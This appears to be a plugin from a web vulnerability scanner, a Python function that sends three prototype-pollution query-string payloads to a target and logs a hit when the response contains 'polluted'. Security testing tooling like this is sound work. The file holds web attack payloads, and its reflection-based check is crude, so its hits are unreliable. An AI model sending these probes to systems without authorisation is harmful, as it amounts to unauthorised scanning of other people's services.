# plugins/proto_pollution.py

import requests

def scan(target, results_dir):
    print(f"[*] Scanning {target} for prototype pollution vulnerabilities...")
    payloads = [
        "?__proto__[polluted]=yes",
        "?constructor[prototype][polluted]=yes",
        "?prototype[polluted]=yes"
    ]

    for p in payloads:
        url = f"{target}{p}"
        try:
            r = requests.get(url, timeout=5)
            if "polluted" in r.text.lower():
                print(f"[!!] Possible prototype pollution at {url}")
                with open(f"{results_dir}/proto_pollution_hits.txt", "a") as f:
                    f.write(f"[POLLUTION] {url}\n")
            else:
                print(f"[-] No prototype pollution detected at {url}")
        except Exception as e:
            print(f"[ERROR] {url} -> {str(e)}")
